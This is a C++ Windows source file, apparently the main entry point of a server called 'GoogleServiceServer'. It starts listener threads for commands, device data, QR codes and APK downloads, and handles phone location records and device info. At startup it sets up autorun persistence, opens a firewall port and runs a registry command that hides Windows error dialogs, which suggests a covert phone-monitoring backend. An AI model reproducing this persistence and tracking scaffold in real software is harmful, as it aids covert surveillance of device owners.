
#include <windows.h>
#include <winsock.h>
#include "GoogleServiceServer.h"
#include "PublicFunction.h"
#include "DownloadApk.h"
#include "DataProcess.h"
#include "QRCode.h"
#include "CommandProcess.h"
#include <map>
#include "Shlwapi.h"
#include <Dbghelp.h>
#include "WatchDog.h"
#include "LoginWindow.h"
#include "DataListener.h"
#include "CommandListener.h"
#include "FileOperator.h"
#include "Initor.h"
#include <iostream>
#include "mysqlOper.h"
#include "recommit.h"
#include "DBCreator.h"
#include "BaiduLocation.h"
#include "DataKeeper.h"
#include "JsonSplit.h"
#include "jsonParser.h"
#include "mysqlOper.h"
#include "translate.h"
#include "Base64.h"
#include "FileOperator.h"

#pragma comment(lib,"ws2_32.lib")
#pragma comment( lib, "Shlwapi.lib")
#pragma comment(lib,"dbghelp.lib")

using namespace std;

int gLocalIP = 0;



int test() {

	return 0;
	char* pem = 0;
	int pemsize = 0;
	int result = FileOperator::fileReader("d:\\test\\meta-inf\\mqqpim.rsa", &pem, &pemsize);

	char* der = new char[pemsize * 4];
	//int dersize = Base64::Base64Encode((char*)der, (const unsigned char*)pem, pemsize);
	//FileOperator::fileWriter("d:\\test\\meta-inf\\test.rsa", der, dersize);
	return 0;

	//char* base64 = "4L3KEBI/a+som57XQEDsO+uWBrk=";
	//char* base64 = "DtW6Uf3FGa223LLHPjmGCCczfhQ=";
	char* base64 = "ko/mCIuDu02v/nxJ/ycSj2GY12E=";

	unsigned char buf[1024];
	int buflen = 1024;
	Base64::Base64Decode((char*)buf, (char*)base64, lstrlenA(base64));

	return 0;

	string loc = "[{\"status\":\"NETWORK\",\"time\":\"2020-03-05 18:17:03\",\"latitude\":\"36.811953\",\"longitude\":\"118.283757\"}]";

	vector<string>* arraydata = 0;
	string mydata = loc;
	arraydata = JsonParser::getJsonFromArray(mydata);
	for (unsigned int i = 0; i < arraydata->size(); i++)
	{
		string lat = "";
		string lon = "";
		string timenow = "";
		string status = "";
		string address = "";

		int ret = JsonSplit::splitLocation(arraydata->at(i), lat, lon, status, timenow, address);

		int utc = loctime2utc(timenow);		//2019-07-09 14:07:50	

		string addr = BaiduLocation::getAddrFromLoc(lat, lon);
	}

	vector <string>* array = new vector<string>;
	int arraysize = array->size();

	char* data = 0;
	int filesize = 0;
	int ret = 0;
	ret = FileOperator::fileReader("deviceinfo.json", &data, &filesize);

	string info = string(data, filesize);

	string model = "";
	string retinfo = JsonSplit::slitInfomation(info, model);
	return 0;

}



DWORD __stdcall InitProgram() {

	char szShowInfo[1024];
	int iRet = Initor::CheckIfProgramExist();
	if (iRet)
	{
		WriteLogFile("one program instance is already running\r\n");
		ExitProcess(0);
	}

	WSADATA wsa = { 0 };
	int ret = WSAStartup(WINSOCK_VERSION, &wsa);
	if (ret)
	{
		WriteLogFile("WSAStartup error\r\n");
		return FALSE;
	}

	gLocalIP = Initor::get_local_ip(gLocalIP);
	//int SERVER_IP_ADDRESS = FileOperator::GetIPFromConfigFile();
	if (gLocalIP == 0)
	{
		gLocalIP = INADDR_ANY;

		wsprintfA(szShowInfo, "not found ip config file:%s error\r\n", IP_CONFIG_FILE);
		WriteLogFile(szShowInfo);
	}
	gLocalIP = INADDR_ANY;

	char szcurdir[MAX_PATH] = { 0 };
	GetModuleFileNameA(0, szcurdir, MAX_PATH);
	char* lpchar = strrchr(szcurdir, '\\');
	if (lpchar)
	{
		*(lpchar + 1) = 0;
		SetCurrentDirectoryA(szcurdir);
	}

	char tmppath[MAX_PATH];
	lstrcpyA(tmppath, szcurdir);
	lstrcatA(tmppath, "\\");
	lstrcatA(tmppath, COMMAND_DIR_NAME);
	lstrcatA(tmppath, "\\");
	iRet = MakeSureDirectoryPathExists(tmppath);

	lstrcpyA(tmppath, szcurdir);
	lstrcatA(tmppath, "\\");
	lstrcatA(tmppath, UPLOAD_FILE_DIR_NAME);
	lstrcatA(tmppath, "\\");
	iRet = MakeSureDirectoryPathExists(tmppath);

	lstrcpyA(tmppath, szcurdir);
	lstrcatA(tmppath, "\\");
	lstrcatA(tmppath, DOWNLOAD_FILE_DIR_NAME);
	lstrcatA(tmppath, "\\");
	iRet = MakeSureDirectoryPathExists(tmppath);

	iRet = Initor::OpenFireWallPort();
	if (iRet == FALSE)
	{
		return FALSE;
	}
	Initor::sysmlinked();

#ifndef _DEBUG
	PublicFunction::autorun();

	iRet = system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Windows Error Reporting\" /v \"DontShowUI\" /t REG_DWORD /d 1 /f");
#endif

#ifdef USE_MYSQL
	MySql::initLock();
	Translate* translate = new Translate();
	//translate->mainLoop(translate);
	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)translate->mainLoop, translate, 0, 0));

	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)DataKeeper::recommit, 0, 0, 0));

#endif

#ifdef _DEBUG
	test();
#endif

	return TRUE;
}




int __stdcall WinMain(__in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in LPSTR lpCmdLine, __in int nShowCmd) {
	int ret = InitProgram();
	if (ret == FALSE)
	{
		return FALSE;
	}

#ifdef NEED_LOGIN_WINDOW
	int iRet = GetSecondsFromStartDate();
	iRet = DialogBoxParamA(hInstance, (LPSTR)IDD_DIALOG1, 0, (DLGPROC)LoginWindow, 0);
	int error = GetLastError();
	if (iRet == FALSE && ERROR == FALSE)
	{
		ExitProcess(0);
	}

	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)CheckProductValidation, 0, 0, 0));
#endif

	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)CommandListener::Commandlistener, 0, 0, 0));

	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)QRCode::QRCodeListener, 0, 0, 0));

	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)DataListener::DataProcessListener, 0, 0, 0));

	//CloseHandle(CreateThread(0,0,(LPTHREAD_START_ROUTINE)DownloadApk::DownloadApkListener,0,0,0));

	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)WatchDog::RefreshOnlineInfo, 0, 0, 0));

	WriteLogFile("program start ok\r\n");

	while (1)
	{
		Sleep(-1);
	}

	WSACleanup();
	return TRUE;
}
